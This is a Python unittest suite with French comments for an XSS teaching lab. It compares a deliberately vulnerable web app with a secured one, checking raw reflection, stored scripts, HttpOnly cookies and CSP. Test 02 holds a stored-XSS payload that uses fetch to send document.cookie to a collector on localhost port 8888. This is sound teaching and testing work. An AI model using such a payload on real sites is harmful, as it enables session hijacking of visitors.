#!/usr/bin/env python3
# ==============================================================================
# SUITE DE TESTS AUTOMATISÉS POUR LE TP XSS
# Valide :
# 1. Vulnérabilité XSS Réfléchi (/search)
# 2. Vulnérabilité XSS Stocké (/guestbook)
# 3. Absence de HttpOnly sur la version vulnérable
# 4. Protection par Échappement HTML sur la version sécurisée
# 5. Présence de HttpOnly et en-tête Content-Security-Policy (CSP)
# ==============================================================================

import time
import subprocess
import sys
import os
import unittest
import requests

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 5000
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))

class TestXSSScenarios(unittest.TestCase):

    def start_server(self, script_path):
        proc = subprocess.Popen(
            [sys.executable, script_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            cwd=PROJECT_ROOT
        )
        for _ in range(30):
            try:
                r = requests.get(f"{BASE_URL}/", timeout=0.5)
                if r.status_code == 200:
                    return proc
            except Exception:
                time.sleep(0.1)
        proc.kill()
        raise RuntimeError(f"Impossible de démarrer {script_path}")

    def stop_server(self, proc):
        if proc:
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()

    # --------------------------------------------------------------------------
    # TESTS DE L'APPLICATION VULNÉRABLE
    # --------------------------------------------------------------------------
    def test_01_reflected_xss_is_injected_raw(self):
        """Vérifie que la balise script injectée dans l'URL ressort telle quelle (non échappée)."""
        app_path = os.path.join(PROJECT_ROOT, "vulnerable", "app.py")
        proc = self.start_server(app_path)
        try:
            payload = "<script>alert('XSS_REFLECTED_TEST')</script>"
            res = requests.get(f"{BASE_URL}/search", params={"q": payload})
            self.assertEqual(res.status_code, 200)
            # Preuve de la faille : la balise n'a PAS été convertie en &lt;script&gt;
            self.assertIn(payload, res.text, "Le payload XSS réfléchi aurait dû être réémis brut dans le HTML !")
            print("\n[OK] Test XSS Réfléchi validé : La balise script s'injecte directement dans le DOM !")
        finally:
            self.stop_server(proc)

    def test_02_stored_xss_persists_in_guestbook(self):
        """Vérifie qu'un payload stocké dans le livre d'or est conservé et restitué brut."""
        app_path = os.path.join(PROJECT_ROOT, "vulnerable", "app.py")
        proc = self.start_server(app_path)
        try:
            payload = "<script>fetch('http://127.0.0.1:8888/?cookie='+document.cookie)</script>"
            # Soumission du commentaire malveillant
            post_res = requests.post(f"{BASE_URL}/guestbook", data={"author": "Hacker", "content": payload})
            self.assertEqual(post_res.status_code, 200)

            # Rechargement de la page par un autre utilisateur
            guestbook_page = requests.get(f"{BASE_URL}/guestbook").text
            self.assertIn(payload, guestbook_page, "Le script malveillant doit persister dans le HTML du livre d'or !")
            print("[OK] Test XSS Stocké validé : Le script malveillant persiste et sera exécuté par tous les visiteurs !")
        finally:
            self.stop_server(proc)

    def test_03_vulnerable_cookie_missing_httponly(self):
        """Vérifie que le cookie de session est accessible sans HttpOnly."""
        app_path = os.path.join(PROJECT_ROOT, "vulnerable", "app.py")
        proc = self.start_server(app_path)
        try:
            res = requests.post(f"{BASE_URL}/login", data={"username": "Ayoub", "password": "password123"}, allow_redirects=False)
            set_cookie = res.headers.get("Set-Cookie", "")
            self.assertNotIn("HttpOnly", set_cookie, "La version vulnérable ne doit PAS avoir HttpOnly pour permettre le vol !")
            print("[OK] Test Cookie Vulnérable validé : Flag HttpOnly absent -> Vol de cookie possible via document.cookie !")
        finally:
            self.stop_server(proc)

    # --------------------------------------------------------------------------
    # TESTS DE L'APPLICATION SÉCURISÉE
    # --------------------------------------------------------------------------
    def test_04_secure_app_escapes_xss_payloads(self):
        """Vérifie que les balises HTML sont bien échappées en entités inoffensives."""
        app_path = os.path.join(PROJECT_ROOT, "secure", "app_secure.py")
        proc = self.start_server(app_path)
        try:
            payload = "<script>alert('ATTACK')</script>"
            # Test Réfléchi
            search_res = requests.get(f"{BASE_URL}/search", params={"q": payload})
            self.assertNotIn(payload, search_res.text, "Le payload brut ne doit JAMAIS apparaître !")
            # Jinja2 échappe ' en &#39;
            self.assertIn("&lt;script&gt;alert(", search_res.text, "Le script doit être encodé en entités HTML !")

            # Test Stocké
            requests.post(f"{BASE_URL}/guestbook", data={"author": "Hacker", "content": payload})
            guestbook_page = requests.get(f"{BASE_URL}/guestbook").text
            self.assertNotIn(payload, guestbook_page)
            self.assertIn("&lt;script&gt;alert(", guestbook_page)
            print("[OK] Test Échappement HTML validé : Les balises <script> sont converties en texte inoffensif (&lt;script&gt;) !")
        finally:
            self.stop_server(proc)

    def test_05_secure_app_enforces_httponly_and_csp(self):
        """Vérifie la présence de HttpOnly et de la Content-Security-Policy (CSP)."""
        app_path = os.path.join(PROJECT_ROOT, "secure", "app_secure.py")
        proc = self.start_server(app_path)
        try:
            res = requests.post(f"{BASE_URL}/login", data={"username": "Ayoub", "password": "password123"}, allow_redirects=False)
            set_cookie = res.headers.get("Set-Cookie", "")
            self.assertIn("HttpOnly", set_cookie, "Le cookie DOIT contenir le flag HttpOnly !")

            page_res = requests.get(f"{BASE_URL}/")
            csp = page_res.headers.get("Content-Security-Policy", "")
            self.assertIn("default-src 'self'", csp, "L'en-tête Content-Security-Policy doit être présent et actif !")
            print("[OK] Test Défense en Profondeur validé : Flags HttpOnly et Content-Security-Policy (CSP) actifs !")
        finally:
            self.stop_server(proc)

if __name__ == '__main__':
    unittest.main()
